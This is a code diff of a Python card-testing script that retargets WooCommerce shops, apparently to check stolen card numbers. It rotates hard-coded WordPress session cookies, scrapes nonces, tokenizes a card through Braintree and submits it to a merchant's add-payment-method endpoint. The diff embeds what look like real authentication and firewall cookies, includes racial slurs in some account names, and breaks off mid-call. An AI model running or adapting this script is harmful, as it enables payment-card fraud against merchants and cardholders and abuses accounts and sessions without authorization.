@@ -20,25 +20,24 @@ def notauto(ccx):
     print(n,mm,yy,cvc)
     user = generate_user_agent() 
     print(user)
+    
+    r=requests.session()
 
     last_used_times = {}
 
   while True:
-    lines = '''aman44%7C1729068200%7CAhlNKSBdyXSb6Tex1yGbZGGL0UAcd8q4UkkK77kKIiy%7C07f026f0088fb411a02e014f1ce906bdf2c11bb7a39dec32c2c76d02228b0656
-jakkw8828378%7C1729072193%7CfDCeif42lwb2Xl3xYuc4PrGQUkjiWyLUGKPtCEjAr6D%7C5fa56d93730a9a095e668ebc6b5f159b449b802ea6d26bfa1ef85375828af581
-aman4%7C1729600606%7CptP0SC4J395eMhosf3rQy0SioasSudJOAEkCltv3vz4%7C33e9a445cfeee0d1b02a6ec748fd51ba536b710a2461e292db99904ac510997c
-29029982dn44%7C1729085674%7CItuoYZQn6KzROVtJ5kiUvtDp0SlrrgBd2Gb610M4sTt%7C3e1e665f28544e8bc232014e6effb315376f2abce8d6ba2a122cb79e00e72ab7
-kowo7256%7C1729085833%7CnOLrP4kWrASgr78gUNYikPbY828WCMWJjhVZcGqDgSa%7C75177d0bee277109d2aa00f7ad34a3dcf56b4db8d9d284508eef70888fe582fa
-leloland362%7C1729086075%7CDdzeLhvGDpDAOZRjEFODWTbi7mdsfMC4sFun3LeAX4o%7Cdd03481728dd7d4a2c74b027ea7feadb808ed8f86c434e2036bf627ea754b57b
-yoursitehacked67%7C1729086268%7C7aeWrBSvLBRmWMjDtmQuz2if9xdQSctlSknynjhm7Yr%7C4bf58f11bc39faafaf3993fe4d837a8c98745ed1d1caef079462e498bc666dbb
-make57282%7C1729651702%7CUbdRoOaIkcsQnUHzvHcJ21d4N8M4FYicB0MS6YyrZeZ%7C2660fcd8b56e8a3109e1e92221420bf2d6e67855a2c0dd1e706ebd2d4133e524
-skk7885wu273%7C1729652503%7Cg0WGf2MURdyYntd1SypICJW9DJQWwrrBztERLxcGtPX%7C02d6d10eefafd7c5a8d683d8f1eadd3c3ae247b9a6f1507bef653a8987d17ad0
-khjk2982%7C1729652714%7C0ExxVYlVwR4pTGe9A4893FH1h6HEwQwcU5VZN9vvupS%7C41a453a300623e6b07e0a3b516e25578247814b97e9b5795cf5841b4e5de0c01
-ko572w8922882%7C1729653109%7CrdAbo4v37Ox6BUAQ0U1mdpP9dVQXzVJpEruAzev922a%7Cf64336586416f8e1f8299421159caefb8e7d46bc0f4704dd662a1d5e61306091
-nksk2882%7C1729652920%7C0bfUnjYmfgttQcsMAD4TWAL1pO6tp79qedv1AyBVVgZ%7C22cf546285fc109514a4fbb1d2673ccb5ad6eec6a558166f3e82d8883647ab4f
-lolnigga682%7C1729652122%7CVBQ3kZh7HwLpWwZLoCkeLAIBJbxGkjGk2hwEDri0dOe%7Cae445954e5069983eafb1881ba6f34143d7d698627ea4aa9cb69c3d0f7f5096c
-niggalelelund63%7C1729652241%7CENZNemMVIdlqdF0FWJ6xQ9m7Q4FloW7eiFbDsJgD8qA%7C122a17f6eed10e2ab5e0ef41a05fbdd9612a94459f1389a8aea9b3c46a1e57f8
-itsprank35%7C1729086469%7CovQrUPoxrZ3SAs7OwLEzGbt9nFaXcaCrZw3CKJ5Zb67%7C4423c41a1c59cd6d40a6cbef6c2218a03a06b31bde7d9f42d5152682b34205e6'''
+    lines = '''eu3828728282882an44%7C1730022006%7CTWHWzJMpQjGTh0Y3BmWU3lTH2im6HwcZZ44QqF4fmQj%7C8bce456e71589127f399e66b164e7757f2e53878ba395d488f5e3bbb21902981
+67eu7372hw8aman44%7C1730019608%7CChXaWU2fVH9gdVnANggbI58fDgFZ4x7kJpmUGS72ibo%7Cfa005a11895bfb139903b85f55114b6904bcd37301e0965383364e3e49e5affa
+3799217813%7C1730029241%7CPvmnZfC5alKeWYJIttiL0AGPeZUC0fl49Laro56OhE6%7C48a9c5c52b6f4038aba97b4aeec67fb24b8948a68d59a141fa8b40d0a407786c
+jhonsmith26622671%7C1730029397%7CY5ERfhWLvx3Hopk0jqWM8njSIfzgwwff7RWudm789Y8%7C34a93f66c1d6e0b8e3e477d0a2d47d1e26b04be191db2b3f140bc40a54cc9495
+nigga67267822%7C1730029509%7CRBnxJeT4JBNCPBKiPjhvqMlq0yG1uq8I89GjBzUlBss%7Cbf5338bb0edccad41c70d9bc406a99a5cc46b4708b4f43ab3728279981395261
+aksha5622277%7C1730029626%7CKyXbhINpdfgSAs6VxuU41YJYarGYVidOzR57p1EMyLm%7C4060a2fb6f2d8f86d3a535152974b350340c39479051e7b1590002a470eb7e02
+leon278922%7C1730029870%7CvWYL1rEfaamcUmXo7oDaQpgMkTmgU5SaG9WrC5SI89p%7C90464af0e7ed8488956fddca65a5f10b178c6397d3a27ce09aca4c65dbf3ce4a
+smkwekkweo9238292%7C1730030191%7CzUvSdDvFTLCty7W8xu0szZ88tDRJj3t3CoT4zrExzdt%7Cac5e68e06a874bd362714ef50f467be8b444c28e78def0352318aab2475d3745
+koowko92772%7C1730030318%7C8gBkQBRDgVhRGL257ekr3x0fj8KVoqTHi8yvkOADJTV%7Ccff366b7efcb846bd2d4c865f843b05a81537d6d2c6edc36e238ce860bec9f52
+gshdieiei8393299%7C1730030572%7CuO8q9nY1EM8dCFfe4WxlOIT5IhkMEx3UjcYfa7rsQ3a%7C331f2436f9aa287ee757b675eccbdaaeb1ce54d0196c6143ba3a3c266121ad87
+ameueuruidiran44%7C1730030711%7CospFKPqQJa68nrRjzx4lR3NSr8EaoGLgHlYlxrfYvFj%7Ca263169698f8d67f31b2c25183766e1936353593b5205c6c3aa38d2497b8986d
+amuue8e822an44%7C1730032845%7C3NL7zXGafMAdVJRIS5542kdKnKU9T1PFjoNbBFBRYBW%7Ce08896341b2dbdf69073fcfb3451645c6e405f6aa5728f453254bd8633253a51'''
     lines = lines.strip().split('\n')
     random_line_number = random.randint(0, len(lines) - 1)
     big = lines[random_line_number]
@@ -57,27 +56,39 @@ itsprank35%7C1729086469%7CovQrUPoxrZ3SAs7OwLEzGbt9nFaXcaCrZw3CKJ5Zb67%7C4423c41a
     file.write(big)
     print(big)
   cookies = {
+    '_gcl_au': '1.1.1863826453.1728802282',
+    '_gid': 'GA1.2.967594922.1728802283',
+    '_clck': 'jwe9yb%7C2%7Cfpz%7C0%7C1747',
+    'brandcdn_uid': 'ab148ebe-5de7-4f42-8d37-9217049e9e52',
+    'tk_ai': 'JIfROvUSUaJraik9IIrIp5EI',
+    '__utmzz': 'utmccn=(not set)',
+    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': big,
+    'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'ab2hwyethtgxqzut080b',
+    'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '8010%7Cother%7Cread%7Cf695110a37a89c69396016408608bb3198b7274a70a333bdf2f437049ffd6cfb',
+    'wp_automatewoo_session_started': '1',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
+    'sbjs_first_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    '_fbp': 'fb.1.1727858534209.685477442657234647',
-    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
-    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
-    'wp_automatewoo_session_started': '1',
-    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
-    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fpayment-methods%2F',
-    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
+    '__utmzzses': '1',
+    '_gat_UA-2829389-2': '1',
+    '_gat_UA-2829389-1': '1',
+    'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fpayment-methods%2F',
+    '_ga_JT1Y3HZ65M': 'GS1.1.1728807005.2.1.1728808703.0.0.0',
+    '_ga': 'GA1.2.1852455351.1728802283',
+    '_clsk': '1wqnafk%7C1728808704723%7C10%7C1%7Ca.clarity.ms%2Fcollect',
+    '_uetsid': '8ed70770892f11ef88335775011a296c',
+    '_uetvid': '8ed7ad20892f11efb54c5fabb712f3ef',
+    'tk_qs': '',
 }
 
   headers = {
-    'authority': 'alphawolfnutrition.com',
+    'authority': 'www.yazoomills.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1727858534209.685477442657234647; wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4=aman44%7C1729068200%7CAhlNKSBdyXSb6Tex1yGbZGGL0UAcd8q4UkkK77kKIiy%7C07f026f0088fb411a02e014f1ce906bdf2c11bb7a39dec32c2c76d02228b0656; wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4=kc11jym9ft1vjq5l75hh; wp_automatewoo_session_started=1; wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788=43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fpayment-methods%2F; __kla_id=eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
-    'referer': 'https://alphawolfnutrition.com/my-account/payment-methods/',
+    'accept-language': 'en-US,en;q=0.9',    
+    'referer': 'https://www.yazoomills.com/my-account/payment-methods/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -86,53 +97,66 @@ itsprank35%7C1729086469%7CovQrUPoxrZ3SAs7OwLEzGbt9nFaXcaCrZw3CKJ5Zb67%7C4423c41a
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': user,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-  response = requests.get('https://alphawolfnutrition.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
+  response = requests.get('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
   add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
   print(add_nonce)
   client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
   print(client)
-
+  
+  
   cookies = {
-    'wordpress_sec_5bb3b822b32877fbbb0b41afc4e7a0c4'
-    '_fbp': 'fb.1.1727858534209.685477442657234647',
-    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
-    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
-    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
+    'wordpress_sec_29d4bb5994f0ca859e9db957c5c93aee'
+    '_gcl_au': '1.1.1863826453.1728802282',
+    '_gid': 'GA1.2.967594922.1728802283',
+    '_clck': 'jwe9yb%7C2%7Cfpz%7C0%7C1747',
+    'brandcdn_uid': 'ab148ebe-5de7-4f42-8d37-9217049e9e52',
+    'tk_ai': 'JIfROvUSUaJraik9IIrIp5EI',
+    '__utmzz': 'utmccn=(not set)',
     'wp_automatewoo_session_started': '1',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-10-02%2009%3A27%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
-    'sbjs_first_add': 'fd%3D2024-10-02%2009%3A27%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_current_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
+    'sbjs_first_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
-    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+    '__utmzzses': '1',
+    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': big,
+    'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'ewr16eyxsvhttc2bwjka',
+    'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '8011%7Cother%7Cread%7Ca97e49c0eb8b33fe0637541a3dd1e993e98fb467b57e4cb0e84033bd832eae9f',
+    'tk_qs': '',
+    '_ga': 'GA1.2.1852455351.1728802283',
+    '_uetsid': '8ed70770892f11ef88335775011a296c',
+    '_uetvid': '8ed7ad20892f11efb54c5fabb712f3ef',
+    '_clsk': '1wqnafk%7C1728811036924%7C30%7C1%7Ca.clarity.ms%2Fcollect',
+    '_ga_JT1Y3HZ65M': 'GS1.1.1728807005.2.1.1728811126.0.0.0',
+    'sbjs_session': 'pgs%3D35%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F',
 }
+  
 
   headers = {
-    'authority': 'alphawolfnutrition.com',
+    'authority': 'www.yazoomills.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    
-    'origin': 'https://alphawolfnutrition.com',
-    'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
+    'origin': 'https://www.yazoomills.com',
+    'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'user-agent': user,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
 }
   data = {
     'action': 'wc_braintree_credit_card_get_client_token',
     'nonce': client,
 }  
-  response = requests.post('https://alphawolfnutrition.com/wp-admin/admin-ajax.php', cookies=cookies,headers=headers, data=data)
+  response = requests.post('https://www.yazoomills.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
 
   ec=(response.json()['data'])
 
@@ -156,14 +180,14 @@ itsprank35%7C1729086469%7CovQrUPoxrZ3SAs7OwLEzGbt9nFaXcaCrZw3CKJ5Zb67%7C4423c41a
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
-    'user-agent': user,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
   json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '9179a736-cf25-40b1-90be-5f032c8c0b41',
+        'sessionId': 'b999d21a-7c58-4a1b-bd9a-6ef95ef8e6d5',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -187,29 +211,42 @@ itsprank35%7C1729086469%7CovQrUPoxrZ3SAs7OwLEzGbt9nFaXcaCrZw3CKJ5Zb67%7C4423c41a
   print(tok)
 
   cookies = {
+    '_gcl_au': '1.1.1863826453.1728802282',
+    '_gid': 'GA1.2.967594922.1728802283',
+    '_clck': 'jwe9yb%7C2%7Cfpz%7C0%7C1747',
+    'brandcdn_uid': 'ab148ebe-5de7-4f42-8d37-9217049e9e52',
+    'tk_ai': 'JIfROvUSUaJraik9IIrIp5EI',
+    '__utmzz': 'utmccn=(not set)',
+    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': big,
+    'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'ab2hwyethtgxqzut080b',
+    'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '8010%7Cother%7Cread%7Cf695110a37a89c69396016408608bb3198b7274a70a333bdf2f437049ffd6cfb',
+    'wp_automatewoo_session_started': '1',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-10-02%2008%3A12%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
+    'sbjs_first_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    '_fbp': 'fb.1.1727858534209.685477442657234647',
-    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
-    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
-    'wp_automatewoo_session_started': '1',
-    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
-    'sbjs_session': 'pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
-    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
+    '__utmzzses': '1',
+    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F',
+    'tk_qs': '',
+    '_uetsid': '8ed70770892f11ef88335775011a296c',
+    '_uetvid': '8ed7ad20892f11efb54c5fabb712f3ef',
+    '_ga_JT1Y3HZ65M': 'GS1.1.1728807005.2.1.1728808858.0.0.0',
+    '_ga': 'GA1.2.1852455351.1728802283',
+    '_gat_UA-2829389-2': '1',
+    '_gat_UA-2829389-1': '1',
+    '_clsk': '1wqnafk%7C1728808862562%7C12%7C1%7Ca.clarity.ms%2Fcollect',
 }
 
   headers = {
-    'authority': 'alphawolfnutrition.com',
+    'authority': 'www.yazoomills.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',  
-    'origin': 'https://alphawolfnutrition.com',
-    'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
+    'content-type': 'application/x-www-form-urlencoded',    
+    'origin': 'https://www.yazoomills.com',
+    'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -218,36 +255,24 @@ itsprank35%7C1729086469%7CovQrUPoxrZ3SAs7OwLEzGbt9nFaXcaCrZw3CKJ5Zb67%7C4423c41a
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': user,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-  data = [
-    ('payment_method', 'braintree_credit_card'),
-    ('wc-braintree-credit-card-card-type', 'master-card'),
-    ('wc-braintree-credit-card-3d-secure-enabled', ''),
-    ('wc-braintree-credit-card-3d-secure-verified', ''),
-    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
-    ('wc_braintree_credit_card_payment_nonce', tok),
-    ('wc_braintree_device_data', '{"correlation_id":"3d3e3d807608835778fe8fc7b573f03d"}'),
-    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
-    ('wc_braintree_paypal_payment_nonce', ''),
-    ('wc_braintree_device_data', '{"correlation_id":"3d3e3d807608835778fe8fc7b573f03d"}'),
-    ('wc-braintree-paypal-context', 'shortcode'),
-    ('wc_braintree_paypal_amount', '0.00'),
-    ('wc_braintree_paypal_currency', 'USD'),
-    ('wc_braintree_paypal_locale', 'en_us'),
-    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
-    ('woocommerce-add-payment-method-nonce', add_nonce),
-    ('_wp_http_referer', '/my-account/add-payment-method/'),
-    ('woocommerce_add_payment_method', '1'),
-  ]
+  data = {
+    'payment_method': 'braintree_credit_card',
+    'wc-braintree-credit-card-card-type': 'master-card',
+    'wc-braintree-credit-card-3d-secure-enabled': '',
+    'wc-braintree-credit-card-3d-secure-verified': '',
+    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+    'wc_braintree_credit_card_payment_nonce': tok,
+    'wc_braintree_device_data': '{"correlation_id":"dfe60bc8114bbfb8101bbf5af294ff27"}',
+    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+    'woocommerce-add-payment-method-nonce': add_nonce,
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'woocommerce_add_payment_method': '1',
+}
 
-  response = requests.post(
